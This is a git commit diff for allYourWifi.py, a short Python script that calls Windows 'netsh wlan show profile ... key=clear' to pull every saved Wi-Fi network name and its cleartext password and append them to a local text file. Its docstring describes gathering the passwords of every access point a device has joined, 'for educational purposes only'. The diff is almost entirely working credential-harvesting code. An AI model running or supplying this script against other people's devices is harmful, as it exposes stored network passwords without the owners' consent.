ee5c89bd4dccb61b82b7249bcf4b197567145dec
Mario J <mjere003@gmail.com>
2021-04-09 20:44:31 -0400

    Update allYourWifi.py

--- allYourWifi.py
+++ allYourWifi.py
@@ -1,3 +1,12 @@
+#!/usr/bin/env python3
+
+'''
+allYourWifi belong to me! Gather the SSIDs and passwords of all wireless access points a windows device
+has been connected to. This is obviously for educational purposes only
+
+- Horrorclause
+'''
+
 import os
 import re
 
@@ -6,7 +15,7 @@ netshCom = os.popen("netsh wlan show profiles")
 wifiList = netshCom.read().split('\n')
 wifiList = [x for x in wifiList if "All User Profile" in x]
 
-# Regex pattern to identify all characters following": " for SSIDs and Passwords (They follow same format)
+# Regex pattern to identify all characters following": " for SSIDs
 regPattern = "(?<=:\s)(.*)"
 
 wifiComplete = {}
@@ -24,12 +33,17 @@ for x in wifiList:
 for i in ssids:
 	i = '"{}"'.format(i)
 	data = os.popen("netsh wlan show profile {} key=clear".format(i)).read().split('\n')
+	data = [x for x in data if "Key Content" in x]
 	for k in data:
+
 		if "Key Content" in k:
 			reg = re.search(regPattern, k)
 			if reg:
-				print("SSID: ", i, '  Password: ', reg.group(0), ' added to dictionary')
 				wifiComplete[i] = reg.group(0)
+				print("SSID: ", i, '  Password: ', reg.group(0), ' added to dictionary')
+
+		else:
+			print("No key content found for {}".format(k))
 
 # Write the saved dictionary to a txt file
 with open("wifiPass.txt", 'a') as f:
